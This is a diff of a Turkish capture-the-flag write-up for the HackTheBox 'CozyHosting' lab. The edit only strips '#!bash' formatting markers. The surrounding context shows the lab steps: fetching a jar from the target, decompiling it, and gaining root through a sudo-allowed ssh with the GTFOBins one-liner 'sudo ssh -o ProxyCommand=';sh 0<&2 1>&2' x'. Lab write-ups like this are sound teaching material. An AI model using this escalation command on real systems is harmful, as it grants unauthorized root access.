@@ -320,7 +320,7 @@ Ve yerel makinemde ilgili dosyayı indirmek için aşağıdaki komutu kullandım
 wget http://cozyhosting.htb:8888/cloudhosting-0.0.1.jar
 ```
 
-Bu dosya ile çalışabilmek için `#!bash jd-gui` isimli kod çözücü (`decompiler`) aracını kullandım:
+Bu dosya ile çalışabilmek için `jd-gui` isimli kod çözücü (`decompiler`) aracını kullandım:
 
 ```bash
 jd-gui cloudhosting-0.0.1.jar
@@ -440,7 +440,7 @@ User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
 ```
 
-Mevcut kullanıcı ile `#!bash ssh` ikili dosyasını çalıştırabildiğimi fark ettim. GTFOBins sitesinde bulunan [zafiyet](https://gtfobins.github.io/gtfobins/ssh/#sudo) ile `root` kullanıcısı oldum:
+Mevcut kullanıcı ile `ssh` ikili dosyasını çalıştırabildiğimi fark ettim. GTFOBins sitesinde bulunan [zafiyet](https://gtfobins.github.io/gtfobins/ssh/#sudo) ile `root` kullanıcısı oldum:
 
 ```bash
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
